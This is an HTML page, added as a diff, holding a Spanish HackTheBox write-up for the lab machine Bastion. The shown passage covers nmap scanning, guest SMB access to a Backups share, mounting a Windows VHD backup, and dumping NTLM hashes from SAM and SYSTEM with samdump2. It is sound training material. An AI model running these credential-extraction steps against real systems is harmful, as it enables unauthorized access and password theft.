@@ -1,0 +1,1381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Bastion</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Bastion | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Bastion" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil. Nos moveremos con Samba, jugaremos con el backup de una máquina virtual Windows para extraer los archivos SAM y SYSTEM… Crackearemos cosillas y nos daremos cuenta que un software guarda contraseñas de acceso al sistema, ¿qué procede? e.e" />
+<meta property="og:description" content="Máquina Windows nivel fácil. Nos moveremos con Samba, jugaremos con el backup de una máquina virtual Windows para extraer los archivos SAM y SYSTEM… Crackearemos cosillas y nos daremos cuenta que un software guarda contraseñas de acceso al sistema, ¿qué procede? e.e" />
+<link rel="canonical" href="http://localhost:4000/htb/bastion" />
+<meta property="og:url" content="http://localhost:4000/htb/bastion" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-08T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png" />
+<meta property="twitter:title" content="HackTheBox - Bastion" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-08T00:00:00-07:00","datePublished":"2021-06-08T00:00:00-07:00","description":"Máquina Windows nivel fácil. Nos moveremos con Samba, jugaremos con el backup de una máquina virtual Windows para extraer los archivos SAM y SYSTEM… Crackearemos cosillas y nos daremos cuenta que un software guarda contraseñas de acceso al sistema, ¿qué procede? e.e","headline":"HackTheBox - Bastion","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/bastion"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/bastion"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Bastion</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-08">08 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png" alt="HackTheBox - Bastion">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Windows</strong> nivel fácil. Nos moveremos con <em>Samba</em>, jugaremos con el backup de una máquina virtual <strong>Windows</strong> para extraer los archivos <strong>SAM</strong> y <strong>SYSTEM</strong>… Crackearemos cosillas y nos daremos cuenta que un software guarda contraseñas de acceso al sistema, ¿qué procede? e.e</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186bastionHTB.png" alt="186bastionHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/29267">L4mpje</a>.</p>
+
+<p>ARAGANEEEEEEEEEEEEEEEZ! A jugar.</p>
+
+<p>Nos enfrentaremos a carpetas compartidas mediante <strong>SMB</strong>, una de ellas tendrá un <em>Backup</em> de una máquina virtual <strong>Windows</strong>, jugando con algunas herramientas y archivos (<strong>SAM</strong> y <strong>SYSTEM</strong>) obtendremos los hashes <strong>NTLM</strong> de los usuarios <strong>Administrator</strong>, <strong>L4mpje</strong> y <strong>Guest</strong>. Jugaremos con <em>cracking</em> para obtener la contraseña en texto plano del usuario <strong>L4mpje</strong>, conseguiremos una sesión mediante <strong>SSH</strong> como él en el sistema.</p>
+
+<p>Enumerando la máquina veremos que existe un programa llamado <strong>mRemoteNG</strong> (que se encarga entre otras cosas de proveer conexión entre protocolos (RDP, SSH, telnet, etc…)), en la web nos indican que ese servicio guarda las credenciales que se han usado para conectarse a otros protocolos (dichos antes, como <strong>SSH</strong>), encontraremos que se guardan en un objeto llamado <code>confCons.xml</code>, dentro están las credenciales encriptadas, usando <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG-Decrypt</a> conseguiremos desencriptarlas y obtener la contraseña en texto plano usada por el usuario <strong>Administrator</strong> para conectarse al sistema… ¿Qué harías?</p>
+
+<p>A darle.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>BUAAAJAJAAAAAaaaaaa, a rompernos!!</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Como nunca hemos hecho, vamos a empezar por un escaneo de puertos mediante <strong>nmap</strong>, así vemos por donde empezar a jugar:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.134 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Nos responde:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Jun  2 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.134
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.134 ()   Status: Up
+Host: 10.10.10.134 ()   Ports: 22/open/tcp//ssh///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 5985/open/tcp//wsman///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
+# Nmap done at Wed Jun  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 76.08 seconds
+</code></pre>
+
+<p>Por lo tanto, tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong></td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">RPC</a></strong></td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong></td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong></td>
+    </tr>
+    <tr>
+      <td>5985, 47001</td>
+      <td style="text-align: left"><strong><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management">WinRM</a></strong></td>
+    </tr>
+    <tr>
+      <td>49664, 49665, 49666, 49667, 49668, 49669, 49670</td>
+      <td style="text-align: left">Desconocidos</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hacemos un escaneo más profundo con base en los puertos encontrados, así podemos investigar sobre que servicio es cada puerto, posiblemente su software y si tiene scripts de <em>nmap</em> relacionados:</p>
+
+<p><strong>~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.134
+    [*] Open ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV 10.10.10.134 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>La respuesta es:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Jun  2 25:25:25 2021 as: nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN portScan 10.10.10.134
+Nmap scan report for 10.10.10.134
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -28m59s, deviation: 1h09m15s, median: 10m58s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-06-02T18:56:49+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-02T16:56:51
+|_  start_date: 2021-06-02T16:33:48
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jun  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 74.97 seconds
+</code></pre>
+
+<p>Cositas interesantes tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH for_Windows_7.9</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">Windows Server 2016 Standard 14393</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">5985, 47001</td>
+      <td style="text-align: left">WinRM</td>
+      <td style="text-align: left">Microsoft HTTPAPI httpd 2.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Un sistema operativo del servidor <em>Samba</em>, pero poco podemos hacer desde ya, así que empecemos a ver por donde entrar :s</p>
+
+<p>…</p>
+
+<h3 id="puertos-smb">Puertos 139-445 SAMBA <a href="#puertos-smb">⌖</a></h3>
+
+<p><a href="https://www.ionos.es/digitalguide/servidores/know-how/server-message-block-smb/">SAMBA</a> en términos generales permite a nodos de una red compartir información (: Corto y sencillo e.e</p>
+
+<p>Podemos jugar con la herramienta <a href="https://www.hackplayers.com/2015/05/smbmap-busca-carpetas-windows-desde-kali.html">smbmap</a> para ver si existen recursos compartidos en la red, como no tenemos usuarios aún, probamos con una sesión nula:</p>
+
+<pre><code class="language-bash">❱ smbmap -H 10.10.10.134 -u '' -p '' 
+[!] Authentication error on 10.10.10.134
+</code></pre>
+
+<p>Pero jugando:</p>
+
+<pre><code class="language-bash">❱ smbmap -H 10.10.10.134 -u '' -p ' '
+[+] Guest session       IP: 10.10.10.134:445    Name: unknown                                           
+[-] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\WGLCGDJOHA, please remove manually
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Backups                                                 READ, WRITE
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+</code></pre>
+
+<p><strong><em>(También funciona así:</em></strong></p>
+
+<pre><code class="language-bash">❱ smbmap -H 10.10.10.134 -u 'null' -p 'null'
+</code></pre>
+
+<p><strong><em>)</em></strong></p>
+
+<p>Bien, vemos 4 recursos, pero solo tenemos acceso de lectura a 2 de ellos: <code>Backups</code> y <code>IPC$</code>, para ver el contenido de esos directorios nos apoyamos de la herramienta <a href="https://jcsis.wordpress.com/2011/08/26/acceder-a-recurso-compartido-desde-un-terminal-linux-con-smbclient/">smbclient</a>, empecemos por <code>Backups</code>:</p>
+
+<pre><code class="language-bash">❱ smbclient //10.10.10.134/Backups -U ''
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Apr 16 05:02:11 2019
+  ..                                  D        0  Tue Apr 16 05:02:11 2019
+  note.txt                           AR      116  Tue Apr 16 05:10:09 2019
+  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
+  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
+
+                7735807 blocks of size 4096. 2752055 blocks available
+smb: \&gt; 
+</code></pre>
+
+<p>Opa, vemos algunos archivos y un directorio, para trabajar cómodos vamos a descargarnos todo el directorio <strong>Backups</strong> a nuestro sistema, lo podemos hacer también con <strong>smbclient</strong>:</p>
+
+<pre><code class="language-bash">smb: \&gt; prompt off
+smb: \&gt; recurse on
+smb: \&gt; mget *
+getting file \note.txt of size 116 as note.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
+getting file \SDT65CB.tmp of size 0 as SDT65CB.tmp (0,0 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+getting file \WindowsImageBackup\L4mpje-PC\MediaId of size 16 as WindowsImageBackup/L4mpje-PC/MediaId (0,0 KiloBytes/sec) (average 0,1 KiloBytes/sec)
+</code></pre>
+
+<p>Pero se queda ahí un rato, para ver el tamaño de lo que estamos descargando podemos usar <a href="https://www.linuxito.com/gnu-linux/nivel-medio/1315-descargar-archivos-desde-un-servidor-samba-con-smbget">smbget</a> que también nos permite descargar directorios compartidos mediante <em>samba</em>:</p>
+
+<pre><code class="language-bash">❱ smbget -R smb://10.10.10.134/Backups -U ''
+Password for [] connecting to //Backups/10.10.10.134: 
+Using workgroup WORKGROUP, guest user
+smb://10.10.10.134/Backups/note.txt
+smb://10.10.10.134/Backups/SDT65CB.tmp
+smb://10.10.10.134/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+[WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd] 2,50MB of 5,05GB ...
+</code></pre>
+
+<p>Pues con razón u.u <strong>5.05</strong> gigas se me descarga en 3 días (:</p>
+
+<p>Lo mejor en este caso, es hacer una <a href="https://linuxize.com/post/how-to-mount-cifs-windows-share-on-linux/">montura de la carpeta compartida</a>, así no tenemos que descargar nada (actualicen <strong>cifs-utils</strong>, me daba problemas y actualizándolo se solucionó):</p>
+
+<pre><code class="language-bash">❱ mkdir /mnt/Backups
+❱ mount -t cifs -o username=' ' //10.10.10.134/Backups /mnt/Backups
+Password for  @//10.10.10.134/Backups: 
+</code></pre>
+
+<p>Y obtenemos:</p>
+
+<pre><code class="language-bash">❱ tree /mnt/Backups/
+/mnt/Backups/
+├── note.txt
+├── SDT65CB.tmp
+└── WindowsImageBackup
+    └── L4mpje-PC
+        ├── Backup 2019-02-22 124351
+        │   ├── 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+        │   ├── 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+        │   ├── BackupSpecs.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+        │   └── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+        ├── Catalog
+        │   ├── BackupGlobalCatalog
+        │   └── GlobalCatalog
+        ├── MediaId
+        └── SPPMetadataCache
+            └── {cd113385-65ff-4ea2-8ced-5630f6feca8f}
+
+5 directories, 19 files
+</code></pre>
+
+<p>Listones, varios archivos a enumerar :P</p>
+
+<p>Una nota:</p>
+
+<pre><code class="language-bash">❱ cat note.txt 
+Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+</code></pre>
+
+<p>Del resto de archivos solo tenemos dos llamativos:</p>
+
+<pre><code class="language-bash">❱ file *
+9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd:                                                     Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1.1 (W2k) Fri Feb 22 12:44:00 2019, 104970240 bytes, CHS 1005/12/17, State 0x1
+9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd:                                                     Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1.1 (W2k) Fri Feb 22 12:44:01 2019, 15999492096 bytes, CHS 31001/16/63, State 0x1
+BackupSpecs.xml:                                                                              data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml: data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml:                                          data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml:                                    data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml:          data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml:          data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml:          data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml:          data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml:          data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml:          data
+cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml:          data
+</code></pre>
+
+<p>Intentando con <strong>strings</strong> o <strong>cat</strong> ante los <code>.xml</code> no logramos ver nada…</p>
+
+<p>Buscando en internet y guiándonos por la descripción de los archivos, vemos que un objeto <code>.vhd</code> es usado para almacenar backups de discos duros virtuales (máquinas virtuales).</p>
+
+<blockquote>
+  <p>May include disk partitions, a file system, files, and folders. <a href="https://fileinfo.com/extension/vhd">VHD extension</a>.</p>
+</blockquote>
+
+<p>Bien, dando algunos pasos por ahí encontramos este recurso:</p>
+
+<ul>
+  <li><a href="https://infinitelogins.com/2020/12/11/how-to-mount-extract-password-hashes-vhd-files/">How to mount VHD files</a>.</li>
+</ul>
+
+<p>Siguiéndolo podemos aprovechar la máquina virtual (backup) que conseguimos para montarla y ver que hay, esto lo logramos con la herramienta <strong>guestmount</strong>:</p>
+
+<pre><code class="language-bash">❱ mkdir /mnt/vhd
+❱ guestmount --add "/mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro -v /mnt/vhd/     
+...
+</code></pre>
+
+<p>Yyyyy:</p>
+
+<pre><code class="language-bash">❱ pwd
+/mnt/vhd
+❱ ls -lh
+total 2,0G
+drwxrwxrwx 1 root root    0 feb 22  2019 '$Recycle.Bin'
+-rwxrwxrwx 1 root root   24 jun 10  2009  autoexec.bat
+-rwxrwxrwx 1 root root   10 jun 10  2009  config.sys
+lrwxrwxrwx 2 root root   14 jul 13  2009 'Documents and Settings' -&gt; /sysroot/Users   
+-rwxrwxrwx 1 root root 2,0G feb 22  2019  pagefile.sys
+drwxrwxrwx 1 root root    0 jul 13  2009  PerfLogs
+drwxrwxrwx 1 root root 4,0K abr 11  2011 'Program Files'
+drwxrwxrwx 1 root root 4,0K jul 13  2009  ProgramData
+drwxrwxrwx 1 root root    0 feb 22  2019  Recovery
+drwxrwxrwx 1 root root 4,0K feb 22  2019 'System Volume Information'
+drwxrwxrwx 1 root root 4,0K feb 22  2019  Users
+drwxrwxrwx 1 root root  16K feb 22  2019  Windows
+</code></pre>
+
+<p>Perfecto, tenemos el contenido de la máquina virtual, ahora nos queda recorrer directorios importantes y ver con que podemos jugar…</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Peeero antes de enloquecernos con tanto archivo, vamos a la fija, ya que es un <em>backup</em> de todo el sistema, debemos tener acceso a los archivos <strong>SAM</strong> y <strong>SYSTEM</strong>, ya que entre los dos tienen las passwords de los usuarios en formato hash <a href="https://www.ionos.es/digitalguide/servidores/know-how/ntlm/">NTLM</a>.</p>
+
+<ul>
+  <li><a href="https://www.top-password.com/blog/tag/windows-sam-registry-file/">What is <strong>Security Accounts Manager (SAM)</strong></a>.</li>
+  <li><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users">Registros en <em>Windows</em></a>.</li>
+</ul>
+
+<p>Por lo general están en la ruta <code>Windows/System32/config</code>:</p>
+
+<pre><code class="language-bash">❱ pwd
+/mnt/vhd/Windows/System32/config
+❱ ls -lh
+total 73M
+...
+-rwxrwxrwx 1 root root 256K feb 22  2019 SAM
+...
+-rwxrwxrwx 1 root root 9,3M feb 22  2019 SYSTEM   
+...
+</code></pre>
+
+<p>Y si (:</p>
+
+<p>Ahora, juntando los archivos con la herramienta <a href="http://www.reydes.com/d/?q=Recuperar_la_Contrasena_del_Administrador_utilizando_samdump2_y_John_The_Ripper">samdump2</a> podemos obtener los hashes de cada usuario, posteriormente podemos intentar <a href="https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack">PassTheHash</a> o crackearlos:</p>
+
+<pre><code class="language-bash">❱ samdump2 SYSTEM SAM 
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::   
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+</code></pre>
+
+<p>Tres usuarios y dos de ellos dicen <em>disabled</em> (ni idea que significara en el contexto), tomemos la última parte de los hashes (que si nos fijamos, es la única parte que es dinámica) y guardémosla en un archivo:</p>
+
+<pre><code class="language-bash">❱ cat ntlm.hashes 
+Administrator:31d6cfe0d16ae931b73c59d7e0c089c0   
+Guest:31d6cfe0d16ae931b73c59d7e0c089c0
+L4mpje:26112010952d963c8dc4217daec986d9
+</code></pre>
+
+<p>Bien…</p>
+
